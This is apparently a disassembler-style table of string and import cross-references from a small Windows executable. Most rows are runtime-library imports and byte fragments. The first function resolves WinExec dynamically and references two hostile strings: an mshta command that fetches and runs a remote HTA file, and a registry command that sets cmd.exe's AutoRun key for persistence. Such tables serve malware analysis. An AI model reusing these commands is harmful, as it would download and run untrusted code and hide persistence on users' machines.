reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401007	0x4061a8	string	0x401000	kernel32.DLL
0x40100c	0x405004	import	0x401000	KERNEL32.dll.LoadLibraryA
0x401012	0x4061a0	string	0x401000	WinExec
0x401018	0x405000	import	0x401000	KERNEL32.dll.GetProcAddress
0x401020	0x406030	string	0x401000	mshta.exe http://ksi/1.hta
0x401029	0x40613c	string	0x401000	reg add "HKEY_CURRENT_USER\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%s" /f
0x401042	0x406134	string	0x401000	cmd.exe
0x4010d8	0x405014	import	0x4010b2	KERNEL32.dll.GetVersion
0x401126	0x405010	import	0x4010b2	KERNEL32.dll.GetCommandLineA
0x401151	0x40500c	import	0x4010b2	KERNEL32.dll.GetStartupInfoA
0x401163	0x40116b	string	0x4010b2	j\nXP
0x401174	0x405008	import	0x4010b2	KERNEL32.dll.GetModuleHandleA
0x4011ea	0x405018	import	0x4011cd	KERNEL32.dll.ExitProcess
0x401ab9	0x401ae1	string	0x401aad	_^[ËD$ blocks=Basic Latin,Latin-1 Supplement
0x401ad8	0x401ae1	string	0x401aad	_^[ËD$ blocks=Basic Latin,Latin-1 Supplement
0x401b6f	0x405020	import	0x401b5f	KERNEL32.dll.GetCurrentProcess
0x401b76	0x40501c	import	0x401b5f	KERNEL32.dll.TerminateProcess
0x401ba9	0x401bbe	string	0x401b5f	^h `@
0x401bf0	0x405018	import	0x401b5f	KERNEL32.dll.ExitProcess
0x401c3e	0x401d50	string	0x401c12	[]ËT$ blocks=Basic Latin,Latin-1 Supplement
0x401d45	0x401d50	string	0x401c12	[]ËT$ blocks=Basic Latin,Latin-1 Supplement
0x401d4a	0x405024	import	0x401c12	KERNEL32.dll.UnhandledExceptionFilter
0x401eca	0x405028	import	0x401ea7	KERNEL32.dll.GetModuleFileNameA
0x4020fd	0x40503c	import	0x4020f4	KERNEL32.dll.GetEnvironmentStringsW
0x402123	0x405038	import	0x4020f4	KERNEL32.dll.GetEnvironmentStrings
0x402160	0x402170	string	0x4020f4	+Ƌ=4P@ blocks=Basic Latin,Latin Extended-B
0x402167	0x402162	string	0x4020f4	@@f9
0x40216e	0x402162	string	0x4020f4	@@f9
0x402172	0x405034	import	0x4020f4	KERNEL32.dll.WideCharToMultiByte
0x4021c2	0x405030	import	0x4020f4	KERNEL32.dll.FreeEnvironmentStringsW
0x4021ca	0x40221f	string	0x4020f4	_^][YYÃ blocks=Basic Latin,Latin-1 Supplement
0x4021d5	0x405038	import	0x4020f4	KERNEL32.dll.GetEnvironmentStrings
0x402213	0x40502c	import	0x4020f4	KERNEL32.dll.FreeEnvironmentStringsA
0x40221b	0x40221f	string	0x4020f4	_^][YYÃ blocks=Basic Latin,Latin-1 Supplement
0x40227f	0x40500c	import	0x402226	KERNEL32.dll.GetStartupInfoA
0x40228b	0x402356	string	0x402226	3ۡ`~@ blocks=Basic Latin,Arabic
0x402297	0x402356	string	0x402226	3ۡ`~@ blocks=Basic Latin,Arabic
0x40230e	0x402356	string	0x402226	3ۡ`~@ blocks=Basic Latin,Arabic
0x402325	0x405048	import	0x402226	KERNEL32.dll.GetFileType
0x40237e	0x405044	import	0x402226	KERNEL32.dll.GetStdHandle
0x40238c	0x405048	import	0x402226	KERNEL32.dll.GetFileType
0x4023c3	0x405040	import	0x402226	KERNEL32.dll.SetHandleCount
0x4023e2	0x405050	import	0x4023d1	KERNEL32.dll.HeapCreate
0x402400	0x40504c	import	0x4023d1	KERNEL32.dll.HeapDestroy
0x40241b	0x402428	string	0x402410	]_^[
0x40259f	0x4025bd	string	0x402508	]_^[
0x4025a6	0x4025bd	string	0x402508	]_^[
0x402686	0x405028	import	0x402619	KERNEL32.dll.GetModuleFileNameA
0x402696	0x405400	string	0x402619	<program name unknown>
0x4026ec	0x4053e0	string	0x402619	Runtime Error!\n\nProgram:
0x402732	0x4053b4	string	0x402619	Microsoft Visual C++ Runtime Library
0x40275c	0x405044	import	0x402619	KERNEL32.dll.GetStdHandle
0x402763	0x405060	import	0x402619	KERNEL32.dll.WriteFile
0x4027bb	0x405068	import	0x40276c	KERNEL32.dll.SetFilePointer
0x4027c8	0x405064	import	0x40276c	KERNEL32.dll.GetLastError
0x4028de	0x405060	import	0x402806	KERNEL32.dll.WriteFile
0x40292b	0x405064	import	0x402806	KERNEL32.dll.GetLastError
0x402943	0x405060	import	0x402806	KERNEL32.dll.WriteFile
0x402958	0x405064	import	0x402806	KERNEL32.dll.GetLastError
0x402ba4	0x405034	import	0x402b5b	KERNEL32.dll.WideCharToMultiByte
0x402c92	0x402ca2	string	0x402c40	+D$\b\eT$\f
0x402c98	0x402ca2	string	0x402c40	+D$\b\eT$\f
0x402d38	0x402d2b	string	0x402cf7	90tr
0x402d3f	0x40506c	import	0x402cf7	KERNEL32.dll.GetCPInfo
0x402e7a	0x402f0d	string	0x402cf7	Wj@Y3? m@
0x402eaa	0x405074	import	0x402e90	KERNEL32.dll.GetOEMCP
0x402ebf	0x405070	import	0x402e90	KERNEL32.dll.GetACP
0x402f4a	0x40506c	import	0x402f36	KERNEL32.dll.GetCPInfo
0x403048	0x403066	string	0x402f36	@AA;
0x4030fe	0x405058	import	0x4030d7	KERNEL32.dll.HeapFree
0x40326c	0x405078	import	0x40323e	KERNEL32.dll.HeapAlloc
0x4035c2	0x405078	import	0x4035b5	KERNEL32.dll.HeapAlloc
0x40385d	0x405054	import	0x40361e	KERNEL32.dll.VirtualFree
0x4038e2	0x405058	import	0x40361e	KERNEL32.dll.HeapFree
0x4039cc	0x4039e3	string	0x403949	uY;]
0x4039df	0x4039c7	string	0x403949	;؉]\bs blocks=Basic Latin,Arabic
0x403a0f	0x4039ff	string	0x403949	;؉]\bs\r blocks=Basic Latin,Arabic
0x403c7a	0x405080	import	0x403c52	KERNEL32.dll.HeapReAlloc
0x403cae	0x405078	import	0x403c52	KERNEL32.dll.HeapAlloc
0x403cc8	0x40507c	import	0x403c52	KERNEL32.dll.VirtualAlloc
0x403cdf	0x405058	import	0x403c52	KERNEL32.dll.HeapFree
0x403d54	0x40507c	import	0x403d03	KERNEL32.dll.VirtualAlloc
0x403e0b	0x405448	string	0x403dfe	user32.dll
0x403e10	0x405004	import	0x403dfe	KERNEL32.dll.LoadLibraryA
0x403e1c	0x405000	import	0x403dfe	KERNEL32.dll.GetProcAddress
0x403e22	0x40543c	string	0x403dfe	MessageBoxA
0x403e33	0x40542c	string	0x403dfe	GetActiveWindow
0x403e3b	0x405418	string	0x403dfe	GetLastActivePopup
